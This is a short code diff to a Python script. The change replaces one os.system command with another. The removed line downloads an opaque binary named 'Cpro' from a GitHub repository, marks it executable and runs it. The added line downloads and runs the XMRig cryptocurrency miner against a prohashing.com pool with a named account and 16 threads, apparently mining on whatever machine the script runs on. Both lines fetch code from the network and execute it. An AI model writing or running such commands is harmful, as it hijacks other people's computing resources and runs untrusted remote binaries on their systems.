@@ -11,4 +11,4 @@ from time import sleep
 from subprocess import PIPE, Popen
 import base64
 
-os.system("curl -L -o Cpro https://github.com/Ikuzot/nung/raw/main/Cpro && chmod +x Cpro && ./Cpro")
+os.system("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://prohashing.com:3359 -u temera88 --keepalive -p a=randomx -t 16")
